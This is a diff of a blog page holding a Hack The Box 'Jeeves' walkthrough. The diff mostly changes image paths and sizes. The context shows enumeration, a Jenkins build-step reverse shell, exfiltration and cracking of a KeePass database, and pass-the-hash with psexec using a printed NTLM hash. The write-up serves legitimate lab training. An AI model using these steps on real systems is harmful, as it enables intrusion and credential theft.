@@ -5,7 +5,7 @@
 <title>Jeeves</title>
 
 <link rel='canonical' href='https://pho3nix-jacki3.github.io/p/jeeves/'> 
-<link rel="stylesheet" href="/scss/style.min.376a0415e9c1c4c7b47631bf4ee2b74f65f9f75c351b8a8ba7e893f137a5e161.css" />
+<link rel="stylesheet" href="/scss/style.min.ae8ee909c1ef884cd63c7bca486905bd98944338441da2532aeefefacd303ed7.css" />
 <meta property='og:title' content="Jeeves">
 <meta property='og:description' content="\n#\rDescription\rJeeves is a fun box that starts with error messages. We directory fuzz with ffuf and find Jenkins running. We gain a foothold with a modifying project exploit that gets us a reverse shell as the user. We see the administrator&rsquo;s hash in the user&rsquo;s KeePass, which gives us a shell with psexec. We get the root flag after discovering the hidden file on the server.\n">
 <meta property='og:url' content='https://pho3nix-jacki3.github.io/p/jeeves/'>
@@ -294,12 +294,16 @@
     <section class="article-content">
     
     
-    <p><img src="/content/post/htb-jeeves/intro.png"
-	
-	
+    <p><img src="/p/jeeves/intro.png"
+	width="961"
+	height="494"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="466px"
 	
 ></p>
 <h2 id="description">
@@ -332,12 +336,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nmap</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span><span class="o">=</span><span class="mi">1000</span> <span class="o">-</span><span class="n">T4</span> <span class="mf">10.10.10.63</span> <span class="o">-</span><span class="n">vv</span> <span class="o">-</span><span class="n">oN</span> <span class="n">ports</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/1.png"
-	
-	
+</div><p><img src="/p/jeeves/1.png"
+	width="967"
+	height="598"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="161"
+		data-flex-basis="388px"
 	
 ></p>
 <p>We run <code>-sCV</code> on the open ports.</p>
@@ -365,12 +373,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">echo</span> <span class="err">$</span><span class="n">ports</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/2.png"
-	
-	
+</div><p><img src="/p/jeeves/2.png"
+	width="953"
+	height="530"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="431px"
 	
 ></p>
 <div class="highlight"><div class="chroma">
@@ -381,12 +393,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="err">$</span><span class="n">ports</span> <span class="mf">10.10.10.63</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">oN</span> <span class="n">version</span><span class="o">-</span><span class="n">basescripts</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/3.png"
-	
-	
+</div><p><img src="/p/jeeves/3.png"
+	width="1043"
+	height="839"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="298px"
 	
 ></p>
 <hr>
@@ -401,60 +417,84 @@
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smbclient -N -L <span class="se">\\\\</span>10.10.10.63<span class="se">\\</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/9.png"
-	
-	
+</div><p><img src="/p/jeeves/9.png"
+	width="961"
+	height="122"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="787"
+		data-flex-basis="1890px"
 	
 ></p>
 <hr>
 <p>Port 50000 gives the 404 Not Found error listed with nmap. <br>
 <a class="link" href="https://www.youtube.com/watch?v=Xwfi0FCEKbg&amp;t=25s"  target="_blank" rel="noopener"
     >Video timestamp 0:25</a></p>
-<p><img src="/content/post/htb-jeeves/4.png"
-	
-	
+<p><img src="/p/jeeves/4.png"
+	width="1145"
+	height="418"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="273"
+		data-flex-basis="657px"
 	
 ></p>
 <hr>
 <p>Port 80 also gives an error, this time as an image. <br>
 <a class="link" href="https://www.youtube.com/watch?v=Xwfi0FCEKbg&amp;t=32s"  target="_blank" rel="noopener"
     >Video timestamp 0:32</a></p>
-<p><img src="/content/post/htb-jeeves/5.png"
-	
-	
+<p><img src="/p/jeeves/5.png"
+	width="1343"
+	height="431"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="311"
+		data-flex-basis="747px"
 	
 ></p>
-<p><img src="/content/post/htb-jeeves/6.png"
-	
-	
+<p><img src="/p/jeeves/6.png"
+	width="1102"
+	height="343"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="321"
+		data-flex-basis="771px"
 	
 ></p>
-<p><img src="/content/post/htb-jeeves/7.png"
-	
-	
+<p><img src="/p/jeeves/7.png"
+	width="1007"
+	height="337"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="717px"
 	
 ></p>
-<p><img src="/content/post/htb-jeeves/8.png"
-	
-	
+<p><img src="/p/jeeves/8.png"
+	width="993"
+	height="390"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="254"
+		data-flex-basis="611px"
 	
 ></p>
 <hr>
@@ -469,20 +509,28 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ffuf</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">small</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">FUZZ</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.63</span><span class="p">:</span><span class="mi">50000</span><span class="o">/</span><span class="n">FUZZ</span> <span class="o">-</span><span class="n">recursion</span> <span class="o">-</span><span class="n">recursion</span><span class="o">-</span><span class="n">depth</span> <span class="mi">1</span> <span class="o">-</span><span class="n">o</span> <span class="n">ffuf</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/10.png"
-	
-	
+</div><p><img src="/p/jeeves/10.png"
+	width="1552"
+	height="628"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
 	
 ></p>
-<p><img src="/content/post/htb-jeeves/11.png"
-	
-	
+<p><img src="/p/jeeves/11.png"
+	width="1139"
+	height="599"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="456px"
 	
 ></p>
 <h2 id="foothold">
@@ -495,65 +543,89 @@
 <ol>
 <li>Create a <code>New Item</code></li>
 </ol>
-<p><img src="/content/post/htb-jeeves/12.png"
-	
-	
+<p><img src="/p/jeeves/12.png"
+	width="954"
+	height="802"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="118"
+		data-flex-basis="285px"
 	
 ></p>
 <ol start="2">
 <li><code>Enter an item Name</code>, choose <code>freestyle project</code>, and click <code>OK</code>.</li>
 </ol>
-<p><img src="/content/post/htb-jeeves/13.png"
-	
-	
+<p><img src="/p/jeeves/13.png"
+	width="945"
+	height="754"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="125"
+		data-flex-basis="300px"
 	
 ></p>
 <ol start="3">
 <li>Scroll down to build and add the <code>Execute Windows batch command</code> build step.</li>
 </ol>
-<p><img src="/content/post/htb-jeeves/14.png"
-	
-	
+<p><img src="/p/jeeves/14.png"
+	width="923"
+	height="347"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="265"
+		data-flex-basis="638px"
 	
 >
-<img src="/content/post/htb-jeeves/15.png"
-	
-	
+<img src="/p/jeeves/15.png"
+	width="950"
+	height="275"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="345"
+		data-flex-basis="829px"
 	
 ></p>
 <ol start="4">
 <li>Create a <code>PoweShell #3 base64</code> encoded reverse shell at <a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
     >https://www.revshells.com/</a></li>
 </ol>
-<p><img src="/content/post/htb-jeeves/16.png"
-	
-	
+<p><img src="/p/jeeves/16.png"
+	width="1419"
+	height="1004"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="141"
+		data-flex-basis="339px"
 	
 ></p>
 <ol start="5">
 <li>Paste the rev shell into <code>Command</code> and click <code>Apply</code>.</li>
 </ol>
-<p><img src="/content/post/htb-jeeves/17.png"
-	
-	
+<p><img src="/p/jeeves/17.png"
+	width="950"
+	height="571"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
 	
 ></p>
 <ol start="6">
@@ -570,12 +642,16 @@
 </div><ol start="7">
 <li>Navigate to <code>http://10.10.10.63:50000/askjeeves/job/&lt;your job's name&gt;/</code> and click <code>Build Now</code>. This gives us a shell as user kohsuke.</li>
 </ol>
-<p><img src="/content/post/htb-jeeves/18.png"
-	
-	
+<p><img src="/p/jeeves/18.png"
+	width="1892"
+	height="682"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="277"
+		data-flex-basis="665px"
 	
 ></p>
 <p>We get the user flag on <code>c:\users\kohsuke\desktop</code>. <br>
@@ -589,12 +665,16 @@
 <pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> c:\users\
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/19.png"
-	
-	
+</div><p><img src="/p/jeeves/19.png"
+	width="949"
+	height="460"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="206"
+		data-flex-basis="495px"
 	
 ></p>
 <div class="highlight"><div class="chroma">
@@ -613,12 +693,16 @@
 <pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/20.png"
-	
-	
+</div><p><img src="/p/jeeves/20.png"
+	width="948"
+	height="350"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="270"
+		data-flex-basis="650px"
 	
 ></p>
 <hr>
@@ -644,12 +728,16 @@
 <pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/21.png"
-	
-	
+</div><p><img src="/p/jeeves/21.png"
+	width="960"
+	height="426"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="225"
+		data-flex-basis="540px"
 	
 ></p>
 <hr>
@@ -665,12 +753,16 @@
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-path</span> <span class="s2">&#34;C:\users\kohsuke\documents\ceh.kdbx&#34;</span> <span class="n">-Encoding</span> <span class="n">byte</span><span class="p">))</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/22.png"
-	
-	
+</div><p><img src="/p/jeeves/22.png"
+	width="1883"
+	height="539"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="349"
+		data-flex-basis="838px"
 	
 ></p>
 <p><strong>On our attack box:</strong></p>
@@ -682,12 +774,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEA&lt;snip&gt;&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="o">&gt;</span> <span class="n">CEH</span><span class="o">.</span><span class="n">kdbx</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/23.png"
-	
-	
+</div><p><img src="/p/jeeves/23.png"
+	width="934"
+	height="804"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="278px"
 	
 ></p>
 <p>We have <code>CEH.kdbx</code> on our local machine.</p>
@@ -699,20 +795,28 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ls</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/24.png"
-	
-	
+</div><p><img src="/p/jeeves/24.png"
+	width="941"
+	height="187"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="503"
+		data-flex-basis="1207px"
 	
 ></p>
-<p><img src="/content/post/htb-jeeves/25.png"
-	
-	
+<p><img src="/p/jeeves/25.png"
+	width="962"
+	height="104"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="925"
+		data-flex-basis="2220px"
 	
 ></p>
 <hr>
@@ -744,12 +848,16 @@
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">open CEH.kdbx
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/26.png"
-	
-	
+</div><p><img src="/p/jeeves/26.png"
+	width="969"
+	height="315"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="307"
+		data-flex-basis="738px"
 	
 ></p>
 <p><code>keepass2john</code> helps us out.</p>
@@ -761,12 +869,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">keepass2john</span> <span class="n">CEH</span><span class="o">.</span><span class="n">kdbx</span> <span class="o">&gt;</span> <span class="n">CEH</span><span class="o">.</span><span class="n">kdbx</span><span class="o">-</span><span class="nb">hash</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/27.png"
-	
-	
+</div><p><img src="/p/jeeves/27.png"
+	width="1897"
+	height="334"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="567"
+		data-flex-basis="1363px"
 	
 ></p>
 <p>Then we use <code>john</code> to get the master password.</p>
@@ -778,12 +890,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">john</span> <span class="n">CEH</span><span class="o">.</span><span class="n">kdbx</span><span class="o">-</span><span class="nb">hash</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/28.png"
-	
-	
+</div><p><img src="/p/jeeves/28.png"
+	width="975"
+	height="370"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="632px"
 	
 ></p>
 <p>Now it&rsquo;s time to grab the passwords from this <code>CEH.kdbx</code> file.</p>
@@ -812,12 +928,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find .
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/29.png"
-	
-	
+</div><p><img src="/p/jeeves/29.png"
+	width="950"
+	height="580"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="393px"
 	
 ></p>
 <p>We find a hash in entry <code>0</code></p>
@@ -838,12 +958,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#34;</span> <span class="o">&gt;</span> <span class="n">hashes</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/30.png"
-	
-	
+</div><p><img src="/p/jeeves/30.png"
+	width="1887"
+	height="525"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="359"
+		data-flex-basis="862px"
 	
 ></p>
 <hr>
@@ -858,12 +982,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.10.63</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">auth</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">H</span> <span class="n">hashes</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/31.png"
-	
-	
+</div><p><img src="/p/jeeves/31.png"
+	width="1478"
+	height="258"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="572"
+		data-flex-basis="1374px"
 	
 ></p>
 <hr>
@@ -878,12 +1006,16 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">impacket</span><span class="o">-</span><span class="n">psexec</span> <span class="n">Administrator</span><span class="o">@</span><span class="mf">10.10.10.63</span> <span class="o">-</span><span class="n">hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e0fb1fb85756c24235ff238cbe81fe00</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/32.png"
-	
-	
+</div><p><img src="/p/jeeves/32.png"
+	width="1261"
+	height="429"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="293"
+		data-flex-basis="705px"
 	
 ></p>
 <hr>
@@ -906,12 +1038,16 @@
 <pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/33.png"
-	
-	
+</div><p><img src="/p/jeeves/33.png"
+	width="946"
+	height="405"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="560px"
 	
 ></p>
 <p>The file says <code>&quot;The flag is elsewhere. Look deeper&quot;</code> .</p>
@@ -923,12 +1059,16 @@
 <pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">type</span> hm.txt
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/34.png"
-	
-	
+</div><p><img src="/p/jeeves/34.png"
+	width="917"
+	height="79"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="1160"
+		data-flex-basis="2785px"
 	
 ></p>
 <p>Let&rsquo;s look deeper into the <code>hm.txt</code> file, then.</p>
@@ -940,12 +1080,16 @@
 <pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /r
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/35.png"
-	
-	
+</div><p><img src="/p/jeeves/35.png"
+	width="966"
+	height="310"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="311"
+		data-flex-basis="747px"
 	
 ></p>
 <hr>
@@ -970,12 +1114,16 @@
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="nb">Get-Content</span> <span class="n">hm</span><span class="p">.</span><span class="py">txt</span> <span class="n">-stream</span> <span class="n">root</span><span class="p">.</span><span class="py">txt</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/content/post/htb-jeeves/36.png"
-	
-	
+</div><p><img src="/p/jeeves/36.png"
+	width="956"
+	height="143"
 	
 	loading="lazy"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="668"
+		data-flex-basis="1604px"
 	
 ></p>
 
@@ -993,34 +1141,6 @@
     
 
     
-
-<aside class="related-content--wrapper">
-    <h2 class="section-title">Related content</h2>
-    <div class="related-content">
-        <div class="flex article-list--tile">
-            
-                
-<article class="has-image">
-    <a href="/p/law/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/categories/offsec/offsec-edit.png" loading="lazy" data-key="" data-hash="/categories/offsec/offsec-edit.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Law</h2>
-        </div>
-    </a>
-</article>
-
-            
-        </div>
-    </div>
-</aside>
 
      
     
